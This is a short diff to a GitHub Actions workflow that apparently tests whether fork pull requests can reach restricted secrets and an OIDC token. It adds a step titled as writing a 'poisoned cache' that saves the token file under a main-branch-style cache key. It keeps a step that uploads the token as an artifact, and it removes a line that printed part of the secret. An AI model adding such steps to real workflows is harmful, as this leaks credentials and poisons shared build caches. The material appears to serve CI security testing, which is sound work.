@@ -26,12 +26,17 @@ jobs:
           print(json.dumps(j, indent=2))"
       - name: Check restricted secret access
         run: |
-          echo "Restricted secret first 8 chars: ${RESTRICTED_SECRET:0:8}..."
           if [ -n "$RESTRICTED_SECRET" ]; then echo "SECRET ACCESSIBLE VIA FORK PR!"; else echo "SECRET BLOCKED"; fi
         env:
           RESTRICTED_SECRET: ${{ secrets.RESTRICTED_SECRET }}
+      - name: Write poisoned cache from fork PR context
+        uses: actions/cache/save@v4
+        with:
+          path: /tmp/oidc_token.txt
+          key: build-deps-main-${{ github.run_id }}
       - uses: actions/upload-artifact@v4
         with:
           name: workflow-run-restricted-env-oidc
           path: /tmp/oidc_token.txt
           retention-days: 1
+
